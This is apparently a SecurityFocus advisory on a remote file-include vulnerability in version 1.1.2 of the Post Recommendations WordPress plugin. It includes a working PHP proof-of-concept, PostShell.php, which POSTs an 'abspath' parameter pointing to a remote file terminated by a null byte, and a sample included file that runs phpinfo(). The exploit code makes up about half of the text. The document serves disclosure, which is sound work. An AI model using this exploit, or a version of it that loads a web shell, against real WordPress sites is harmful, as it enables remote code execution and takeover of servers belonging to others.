source: http://www.securityfocus.com/bid/54459/info

The Post Recommendations plug-in for WordPress is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue could allow an attacker to compromise the application and the underlying system; other attacks are also possible.

Post Recommendations 1.1.2 is vulnerable; other versions may also be affected. 

PostShell.php
<?php

$ch = curl_init("http://localhost/wordpress/wp-content/plugins/post-recommendations-for-wordpress/lib/api.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array('abspath'=>"http://localhost/lo.txt\0"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);

print "$postResult";

?>


lo.txt
<?php phpinfo(); ?>